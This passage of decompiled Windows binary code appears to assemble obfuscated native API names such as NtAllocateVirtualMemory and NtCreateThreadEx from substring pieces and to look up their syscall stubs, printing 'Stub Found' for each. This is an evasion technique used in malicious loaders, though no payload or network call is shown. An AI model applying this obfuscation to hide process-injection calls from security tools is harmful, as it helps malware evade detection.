L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007432;\n    fcn.1400ba740(&stack0x00002378 + iVar5, &stack0x00002398 + iVar5, L\"CThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000744f;\n    fcn.1400ba740(&stack0x00002358 + iVar5, &stack0x00002378 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000746c;\n    fcn.1400ba740(&stack0x00002338 + iVar5, &stack0x00002358 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007489;\n    fcn.1400ba740(&stack0x00002318 + iVar5, &stack0x00002338 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400074a6;\n    fcn.1400ba740(&stack0x000022f8 + iVar5, &stack0x00002318 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400074c3;\n    fcn.1400ba740(&stack0x000022d8 + iVar5, &stack0x000022f8 + iVar5, L\"xRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400074e0;\n    fcn.1400ba740(&stack0x000022b8 + iVar5, &stack0x000022d8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400074fd;\n    fcn.1400ba740(&stack0x00002298 + iVar5, &stack0x000022b8 + iVar5, L\"ThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000751a;\n    fcn.1400ba740(&stack0x00002278 + iVar5, &stack0x00002298 + iVar5, L\"hdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007537;\n    fcn.1400ba740(&stack0x00002258 + iVar5, &stack0x00002278 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007554;\n    fcn.1400ba740(&stack0x00002238 + iVar5, &stack0x00002258 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007571;\n    fcn.1400ba740(&stack0x00002218 + iVar5, &stack0x00002238 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000758e;\n    fcn.1400ba740(&stack0x000021f8 + iVar5, &stack0x00002218 + iVar5, L\"dExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400075a4;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x000021f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400075b3;\n    fcn.1400aa2e0(&stack0x000021f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400075c2;\n    fcn.1400aa2e0(&stack0x00002218 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400075d1;\n    fcn.1400aa2e0(&stack0x00002238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400075e0;\n    fcn.1400aa2e0(&stack0x00002258 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400075ef;\n    fcn.1400aa2e0(&stack0x00002278 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400075fe;\n    fcn.1400aa2e0(&stack0x00002298 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000760d;\n    fcn.1400aa2e0(&stack0x000022b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000761c;\n    fcn.1400aa2e0(&stack0x000022d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000762b;\n    fcn.1400aa2e0(&stack0x000022f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000763a;\n    fcn.1400aa2e0(&stack0x00002318 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007649;\n    fcn.1400aa2e0(&stack0x00002338 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007658;\n    fcn.1400aa2e0(&stack0x00002358 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007667;\n    fcn.1400aa2e0(&stack0x00002378 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007676;\n    fcn.1400aa2e0(&stack0x00002398 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007685;\n    fcn.1400aa2e0(&stack0x000023b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007694;\n    fcn.1400aa2e0(&stack0x000023d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400076a3;\n    fcn.1400aa2e0(&stack0x000023f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400076b2;\n    fcn.1400aa2e0(&stack0x00002418 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400076c1;\n    fcn.140072290(&stack0x00002447 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400076d7;\n    fcn.1400a9730(&stack0x00002448 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fb8 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007713;\n    uVar3 = fcn.1400015bd(&stack0x00002448 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007728;\n    fcn.1400aa2e0(&stack0x00002448 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007750;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007765;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007774;\n    fcn.140072260(&stack0x00002677 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007794;\n    fcn.1400a9bc0(&stack0x00002648 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00002677 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400077b1;\n    fcn.1400ba740(&stack0x00002628 + iVar5, &stack0x00002648 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400077ce;\n    fcn.1400ba740(&stack0x00002608 + iVar5, &stack0x00002628 + iVar5, L\"Dw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400077eb;\n    fcn.1400ba740(&stack0x000025e8 + iVar5, &stack0x00002608 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007808;\n    fcn.1400ba740(&stack0x000025c8 + iVar5, &stack0x000025e8 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007825;\n    fcn.1400ba740(&stack0x000025a8 + iVar5, &stack0x000025c8 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007842;\n    fcn.1400ba740(&stack0x00002588 + iVar5, &stack0x000025a8 + iVar5, \n                  L\"y\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000785f;\n    fcn.1400ba740(&stack0x00002568 + iVar5, &stack0x00002588 + iVar5, L\"ExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000787c;\n    fcn.1400ba740(&stack0x00002548 + iVar5, &stack0x00002568 + iVar5, L\"xRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007899;\n    fcn.1400ba740(&stack0x00002528 + iVar5, &stack0x00002548 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400078b6;\n    fcn.1400ba740(&stack0x00002508 + iVar5, &stack0x00002528 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400078d3;\n    fcn.1400ba740(&stack0x000024e8 + iVar5, &stack0x00002508 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400078f0;\n    fcn.1400ba740(&stack0x000024c8 + iVar5, &stack0x000024e8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000790d;\n    fcn.1400ba740(&stack0x000024a8 + iVar5, &stack0x000024c8 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000792a;\n    fcn.1400ba740(&stack0x00002488 + iVar5, &stack0x000024a8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007947;\n    fcn.1400ba740(&stack0x00002468 + iVar5, &stack0x00002488 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000795d;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00002468 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000796c;\n    fcn.1400aa2e0(&stack0x00002468 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000797b;\n    fcn.1400aa2e0(&stack0x00002488 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000798a;\n    fcn.1400aa2e0(&stack0x000024a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007999;\n    fcn.1400aa2e0(&stack0x000024c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400079a8;\n    fcn.1400aa2e0(&stack0x000024e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400079b7;\n    fcn.1400aa2e0(&stack0x00002508 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400079c6;\n    fcn.1400aa2e0(&stack0x00002528 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400079d5;\n    fcn.1400aa2e0(&stack0x00002548 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400079e4;\n    fcn.1400aa2e0(&stack0x00002568 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400079f3;\n    fcn.1400aa2e0(&stack0x00002588 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007a02;\n    fcn.1400aa2e0(&stack0x000025a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007a11;\n    fcn.1400aa2e0(&stack0x000025c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007a20;\n    fcn.1400aa2e0(&stack0x000025e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007a2f;\n    fcn.1400aa2e0(&stack0x00002608 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007a3e;\n    fcn.1400aa2e0(&stack0x00002628 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007a4d;\n    fcn.1400aa2e0(&stack0x00002648 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007a5c;\n    fcn.140072290(&stack0x00002677 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007a72;\n    fcn.1400a9730(&stack0x00002678 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fb0 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007aae;\n    uVar3 = fcn.1400015bd(&stack0x00002678 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007ac3;\n    fcn.1400aa2e0(&stack0x00002678 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007aeb;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007b00;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007b0f;\n    fcn.140072260(&stack0x00002847 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007b2f;\n    fcn.1400a9bc0(&stack0x00002818 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00002847 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007b4c;\n    fcn.1400ba740(&stack0x000027f8 + iVar5, &stack0x00002818 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007b69;\n    fcn.1400ba740(&stack0x000027d8 + iVar5, &stack0x000027f8 + iVar5, L\"ObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007b86;\n    fcn.1400ba740(&stack0x000027b8 + iVar5, &stack0x000027d8 + iVar5, L\"pGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007ba3;\n    fcn.1400ba740(&stack0x00002798 + iVar5, &stack0x000027b8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007bc0;\n    fcn.1400ba740(&stack0x00002778 + iVar5, &stack0x00002798 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007bdd;\n    fcn.1400ba740(&stack0x00002758 + iVar5, &stack0x00002778 + iVar5, L\"SngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007bfa;\n    fcn.1400ba740(&stack0x00002738 + iVar5, &stack0x00002758 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007c17;\n    fcn.1400ba740(&stack0x00002718 + iVar5, &stack0x00002738 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007c34;\n    fcn.1400ba740(&stack0x000026f8 + iVar5, &stack0x00002718 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007c51;\n    fcn.1400ba740(&stack0x000026d8 + iVar5, &stack0x000026f8 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007c6e;\n    fcn.1400ba740(&stack0x000026b8 + iVar5, &stack0x000026d8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007c8b;\n    fcn.1400ba740(&stack0x00002698 + iVar5, &stack0x000026b8 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007ca1;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00002698 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007cb0;\n    fcn.1400aa2e0(&stack0x00002698 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007cbf;\n    fcn.1400aa2e0(&stack0x000026b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007cce;\n    fcn.1400aa2e0(&stack0x000026d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007cdd;\n    fcn.1400aa2e0(&stack0x000026f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007cec;\n    fcn.1400aa2e0(&stack0x00002718 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007cfb;\n    fcn.1400aa2e0(&stack0x00002738 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d0a;\n    fcn.1400aa2e0(&stack0x00002758 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d19;\n    fcn.1400aa2e0(&stack0x00002778 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d28;\n    fcn.1400aa2e0(&stack0x00002798 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d37;\n    fcn.1400aa2e0(&stack0x000027b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d46;\n    fcn.1400aa2e0(&stack0x000027d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d55;\n    fcn.1400aa2e0(&stack0x000027f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d64;\n    fcn.1400aa2e0(&stack0x00002818 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d73;\n    fcn.140072290(&stack0x00002847 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007d89;\n    fcn.1400a9730(&stack0x00002848 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fa8 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007dc5;\n    uVar3 = fcn.1400015bd(&stack0x00002848 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007dda;\n    fcn.1400aa2e0(&stack0x00002848 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007e02;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007e17;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007e26;\n    fcn.140072260(&stack0x00002ab7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007e46;\n    fcn.1400a9bc0(&stack0x00002a88 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00002ab7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007e63;\n    fcn.1400ba740(&stack0x00002a68 + iVar5, &stack0x00002a88 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007e80;\n    fcn.1400ba740(&stack0x00002a48 + iVar5, &stack0x00002a68 + iVar5, \n                  L\"Mmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007e9d;\n    fcn.1400ba740(&stack0x00002a28 + iVar5, &stack0x00002a48 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007eba;\n    fcn.1400ba740(&stack0x00002a08 + iVar5, &stack0x00002a28 + iVar5, L\"pGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007ed7;\n    fcn.1400ba740(&stack0x000029e8 + iVar5, &stack0x00002a08 + iVar5, \n                  L\"ViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007ef4;\n    fcn.1400ba740(&stack0x000029c8 + iVar5, &stack0x000029e8 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007f11;\n    fcn.1400ba740(&stack0x000029a8 + iVar5, &stack0x000029c8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007f2e;\n    fcn.1400ba740(&stack0x00002988 + iVar5, &stack0x000029a8 + iVar5, L\"w\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007f4b;\n    fcn.1400ba740(&stack0x00002968 + iVar5, &stack0x00002988 + iVar5, L\"ObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007f68;\n    fcn.1400ba740(&stack0x00002948 + iVar5, &stack0x00002968 + iVar5, L\"fpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007f85;\n    fcn.1400ba740(&stack0x00002928 + iVar5, &stack0x00002948 + iVar5, L\"SngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007fa2;\n    fcn.1400ba740(&stack0x00002908 + iVar5, &stack0x00002928 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007fbf;\n    fcn.1400ba740(&stack0x000028e8 + iVar5, &stack0x00002908 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007fdc;\n    fcn.1400ba740(&stack0x000028c8 + iVar5, &stack0x000028e8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007ff9;\n    fcn.1400ba740(&stack0x000028a8 + iVar5, &stack0x000028c8 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008016;\n    fcn.1400ba740(&stack0x00002888 + iVar5, &stack0x000028a8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008033;\n    fcn.1400ba740(&stack0x00002868 + iVar5, &stack0x00002888 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008049;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00002868 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008058;\n    fcn.1400aa2e0(&stack0x00002868 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008067;\n    fcn.1400aa2e0(&stack0x00002888 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008076;\n    fcn.1400aa2e0(&stack0x000028a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008085;\n    fcn.1400aa2e0(&stack0x000028c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008094;\n    fcn.1400aa2e0(&stack0x000028e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400080a3;\n    fcn.1400aa2e0(&stack0x00002908 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400080b2;\n    fcn.1400aa2e0(&stack0x00002928 + iVar5);\n    